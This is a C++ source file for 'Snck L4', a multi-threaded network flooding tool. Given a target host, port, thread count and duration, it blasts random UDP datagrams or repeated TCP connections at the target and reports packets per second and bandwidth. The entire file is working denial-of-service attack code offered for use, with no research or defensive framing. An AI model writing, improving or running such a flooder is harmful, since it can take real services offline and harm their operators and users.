// language: C++17, file: cpp/snck_l4.cpp, target: Linux
// Snck ultra L4 core — multi-thread UDP/TCP/SYN/ACK/MIX
// Build: g++ -O3 -march=native -pthread -std=c++17 -o snck_l4 snck_l4.cpp
// Usage: ./snck_l4 <udp|tcp|syn|ack|mix> <host> <port> <threads> <duration> [payload]

#include <arpa/inet.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <unistd.h>

#include <atomic>
#include <chrono>
#include <cstring>
#include <iostream>
#include <random>
#include <string>
#include <thread>
#include <vector>

using namespace std;
using steady = chrono::steady_clock;

static atomic<uint64_t> g_packets{0};
static atomic<uint64_t> g_bytes{0};
static atomic<uint64_t> g_errors{0};
static atomic<bool> g_stop{false};

static string resolve_ip(const string& host) {
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host.c_str(), nullptr, &hints, &res) != 0 || !res)
        return host;
    char buf[INET_ADDRSTRLEN]{};
    inet_ntop(AF_INET, &reinterpret_cast<sockaddr_in*>(res->ai_addr)->sin_addr, buf, sizeof(buf));
    freeaddrinfo(res);
    return string(buf);
}

static void fill_random(vector<uint8_t>& buf, mt19937& rng) {
    uniform_int_distribution<int> d(0, 255);
    for (auto& b : buf) b = static_cast<uint8_t>(d(rng));
}

static void worker_udp(string ip, uint16_t port, int payload_size) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { g_errors++; return; }
    int bufsize = 32 * 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &bufsize, sizeof(bufsize));
#ifdef SO_BUSY_POLL
    int busy = 50;
    setsockopt(fd, SOL_SOCKET, SO_BUSY_POLL, &busy, sizeof(busy));
#endif
    int on = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    thread_local mt19937 rng{random_device{}()};
    vector<uint8_t> payload(static_cast<size_t>(payload_size));
    fill_random(payload, rng);

    while (!g_stop.load(memory_order_relaxed)) {
        for (int i = 0; i < 8 && !g_stop.load(memory_order_relaxed); ++i) {
            ssize_t n = sendto(fd, payload.data(), payload.size(), MSG_NOSIGNAL,
                               reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
            if (n > 0) {
                g_packets.fetch_add(1, memory_order_relaxed);
                g_bytes.fetch_add(static_cast<uint64_t>(n), memory_order_relaxed);
            } else {
                g_errors.fetch_add(1, memory_order_relaxed);
            }
        }
    }
    close(fd);
}

static void worker_tcp(string ip, uint16_t port, int payload_size, bool write_data) {
    thread_local mt19937 rng{random_device{}()};
    vector<uint8_t> payload(static_cast<size_t>(min(payload_size, 1400)));
    fill_random(payload, rng);

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    while (!g_stop.load(memory_order_relaxed)) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) { g_errors.fetch_add(1, memory_order_relaxed); continue; }

        int flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);
        int on = 1;
        setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &on, sizeof(on));

        int rc = connect(fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
        if (rc < 0 && errno != EINPROGRESS) {
            close(fd);
            g_errors.fetch_add(1, memory_order_relaxed);
            continue;
        }

        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(fd, &wfds);
        timeval tv{0, 400000};
        rc = select(fd + 1, nullptr, &wfds, nullptr, &tv);
        if (rc <= 0) {
            close(fd);
            g_errors.fetch_add(1, memory_order_relaxed);
            continue;
        }

        if (write_data) {
            fcntl(fd, F_SETFL, flags);
            ssize_t n = send(fd, payload.data(), payload.size(), MSG_NOSIGNAL);
            if (n > 0) {
                g_packets.fetch_add(1, memory_order_relaxed);
                g_bytes.fetch_add(static_cast<uint64_t>(n), memory_order_relaxed);
            } else {
                g_errors.fetch_add(1, memory_order_relaxed);
            }
        } else {
            g_packets.fetch_add(1, memory_order_relaxed);
            g_bytes.fetch_add(64, memory_order_relaxed);
        }
        close(fd);
    }
}

static void worker_mix(string ip, uint16_t port, int payload_size, int id) {
    if (id & 1) worker_tcp(ip, port, payload_size, true);
    else worker_udp(ip, port, payload_size);
}

int main(int argc, char** argv) {
    if (argc < 6) {
        cerr << "Snck L4 ultra\n"
             << "Usage: " << argv[0]
             << " <udp|tcp|syn|ack|mix> <host> <port> <threads> <duration> [payload]\n";
        return 1;
    }

    string method = argv[1];
    string host = argv[2];
    int port = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int duration = atoi(argv[5]);
    int payload = argc >= 7 ? atoi(argv[6]) : 1200;

    if (port < 1 || port > 65535 || threads < 1 || threads > 8192 || duration < 1)
        return 1;
    payload = max(16, min(payload, 65507));

    string ip = resolve_ip(host);
    cerr << "[snck_l4] " << method << " " << ip << ":" << port
         << " threads=" << threads << " duration=" << duration
         << " payload=" << payload << "\n";

    vector<thread> pool;
    pool.reserve(static_cast<size_t>(threads));
    for (int i = 0; i < threads; ++i) {
        if (method == "udp")
            pool.emplace_back(worker_udp, ip, (uint16_t)port, payload);
        else if (method == "tcp" || method == "ack")
            pool.emplace_back(worker_tcp, ip, (uint16_t)port, payload, true);
        else if (method == "syn")
            pool.emplace_back(worker_tcp, ip, (uint16_t)port, payload, false);
        else if (method == "mix")
            pool.emplace_back(worker_mix, ip, (uint16_t)port, payload, i);
        else {
            cerr << "unknown method\n";
            return 1;
        }
    }

    auto t0 = steady::now();
    while (chrono::duration<double>(steady::now() - t0).count() < duration) {
        this_thread::sleep_for(chrono::milliseconds(500));
        double elapsed = chrono::duration<double>(steady::now() - t0).count();
        uint64_t pkts = g_packets.load();
        uint64_t by = g_bytes.load();
        cout << "STATS packets=" << pkts << " bytes=" << by
             << " errors=" << g_errors.load()
             << " pps=" << (pkts / max(elapsed, 0.001))
             << " mbps=" << ((by * 8.0) / max(elapsed, 0.001) / 1e6) << endl;
    }

    g_stop = true;
    for (auto& t : pool) if (t.joinable()) t.join();

    double elapsed = chrono::duration<double>(steady::now() - t0).count();
    uint64_t pkts = g_packets.load();
    uint64_t by = g_bytes.load();
    cout << "DONE packets=" << pkts << " bytes=" << by
         << " errors=" << g_errors.load()
         << " pps=" << (pkts / max(elapsed, 0.001))
         << " mbps=" << ((by * 8.0) / max(elapsed, 0.001) / 1e6)
         << " elapsed=" << elapsed << endl;
    return 0;
}
